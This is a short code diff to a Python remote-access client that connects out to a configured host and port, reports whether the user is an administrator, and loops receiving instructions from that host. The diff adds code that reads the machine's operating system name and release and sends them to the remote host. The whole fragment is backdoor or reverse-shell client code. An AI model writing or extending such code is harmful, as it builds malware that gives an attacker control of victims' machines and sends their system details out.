@@ -3,6 +3,8 @@ import subprocess
 import os
 import sys
 import ctypes
+import platform
+import time
 
 def inbound():
     while True:
@@ -21,6 +23,10 @@ def session_handler():
     sock.connect((HOST_IP, HOST_PORT))
     print(f"[+] Connected to {HOST_IP}.")
     outbound(ctypes.windll.shell32.IsUserAnAdmin())
+    time.sleep(5)
+    operating_system = platform.uname()
+    operating_system = f"{operating_system[0]}{operating_system[2]}"
+    outbound(operating_system)
     while True:
         message = inbound()
         print(f"[+] Instruction recieved --> {message}")
